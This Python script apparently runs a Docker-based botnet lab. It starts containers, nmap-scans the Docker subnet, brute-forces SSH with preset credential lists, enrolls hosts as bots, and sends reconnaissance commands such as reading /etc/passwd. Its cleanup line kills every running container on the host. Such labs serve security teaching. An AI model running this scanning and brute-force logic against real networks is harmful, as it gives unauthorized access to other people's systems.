"""
:summary This is the main operating file for this repository/lab
"""
# libraries
from os import system
from random import choice
from itertools import product

from nmap import PortScanner

from BotNet import BotnetManager
from setup import DEFAULT_IMAGE_NAME, PRESET_USERNAMES_FILEPATH, PRESET_PASSWORDS_FILEPATH, \
                 read_file_contents





# constants
NUM_NODES = 10
DEFAULT_COMMANDS = ['ls -l', 'cat /etc/passwd | grep /home/', 'ps -aux', 'id', 'whoami']
MANAGER = BotnetManager()





if __name__ == '__main__':
    # 1. Verify dockerfiles have were built
    system('docker images | grep botnet | wc -l > t.txt')

    with open('t.txt', 'r', encoding='utf-8') as f:
        num_botnet_images = int( f.readlines()[0] )

    system('rm -f t.txt')

    if num_botnet_images <= 0:
        raise ValueError("[-] No botnet images availables." + \
                         " Run python3 setup.py with all flags set to True")
    print(f"[+] Detected {num_botnet_images} botnet images", end='\n\n')



    # 2. Create `NUM_NODES` containers using images at random
    all_botnet_images = [f"{DEFAULT_IMAGE_NAME}{_id}" for _id in range(num_botnet_images)]
    selected_botnet_images = [choice(all_botnet_images) for _ in range(NUM_NODES)]

    for selected_image in selected_botnet_images:
        print(f"[#] Creating container based on {selected_image}")
        system(f"docker run --rm -dt {selected_image}")



    # 3. Scan network for all (docker) machines
    print("\n[+] Running PortScanner")
    scanner = PortScanner()
    scanner.scan('172.17.0.2-255')
    print(f"[+] Found {len(scanner.all_hosts())} Nodes")

    ssh_hosts = []
    for node in scanner.all_hosts():
        for protocol in scanner[node].all_protocols():
            for port_number, port_properties in scanner[node][protocol].items():
                if port_properties['state'] == 'open' and port_properties['name'] == 'ssh':
                    print('\t' + f"[#] Detected SSH for {node}:{port_number}")
                    ssh_hosts.append(node)
                    system(f'ssh-keygen -f ~/.ssh/known_hosts -R {node} > /dev/null')
    print(f"[+] Identified {len(ssh_hosts)} ready for SSH", end='\n\n')



    # 4. Set up user/pass combos
    print("[+] Configuring user/passwd permutations")
    possible_usernames = read_file_contents(PRESET_USERNAMES_FILEPATH)[:6]
    possible_passwords = read_file_contents(PRESET_PASSWORDS_FILEPATH)[:6]
    possible_combos = [{'username': p[0].strip(),
                        'password': p[1].strip()} for p in product(possible_usernames,
                                                                   possible_passwords)]
    print(f"[#] Identified {len(possible_combos)} possible permutations...", end='\n\n')

    # 5. Begin brute force of hosts
    for node in ssh_hosts:
        print(f"[+] Attempting to brute-force {node}")
        is_added = False

        for index, combo in enumerate(possible_combos):
            user, passwd = combo['username'], combo['password']

            if index % 100 == 0 and index > 0:
                print(f"[#] Testing #{index} of {len(possible_combos)}")

            if not is_added:
                is_added = MANAGER.add_bot(node, user, passwd)

            if is_added:
                print(f"    [#] Successfully connected to {node} user={user} passwd={passwd}")
                break

        if not is_added:
            raise ValueError("No user/pass found!")


    MANAGER.list_bots()
    for cmd in DEFAULT_COMMANDS:
        MANAGER.send_command(cmd)


    # N. kills all running containers
    print("\n[-] Cleaning up lab environment - stopping and deleting all running containers")
    system("docker kill $(docker ps -q)")
